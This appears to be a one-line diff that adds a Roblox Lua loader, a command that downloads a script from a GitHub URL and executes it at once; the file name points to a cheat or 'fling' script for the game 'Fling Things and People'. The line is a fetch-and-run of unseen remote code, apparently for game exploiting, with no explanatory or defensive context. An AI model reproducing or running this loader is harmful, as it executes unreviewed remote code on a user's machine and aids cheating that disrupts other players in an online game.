@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/fling-things-and-people-spam6-50h7htsyevuwhc.lua"))()
